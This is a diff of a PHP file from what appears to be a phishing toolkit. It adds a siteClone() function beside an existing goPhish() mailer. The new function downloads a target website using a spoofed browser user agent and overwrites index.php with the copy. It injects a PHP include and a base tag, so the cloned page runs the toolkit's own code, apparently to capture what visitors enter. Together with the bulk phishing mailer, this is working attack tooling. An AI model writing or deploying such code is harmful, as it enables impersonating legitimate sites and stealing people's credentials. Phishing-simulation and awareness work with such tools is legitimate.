@@ -408,4 +408,30 @@ function goPhish($campaignName,$emailFrom,$targets,$subject)
 		mail($line, $subject, $email, $headers);
 	}
 }
+
+function siteClone($url)
+{
+        $ch = curl_init();
+        $timeout = 5;
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+        curl_setopt($ch, CURLOPT_FAILONERROR, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $userAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)";
+        curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
+
+        $data = curl_exec($ch);
+        curl_close($ch);
+        
+        $file = fopen("../index.php", "w");
+        $template = str_replace("<head>", "<head><?php include('includes/include.php') ?><base href=" . $url . " target=\"_blank\">", $data);
+        fwrite($file, $template);
+        fclose($file);
+
+        
+        return "Check index.php";
+}
 ?>
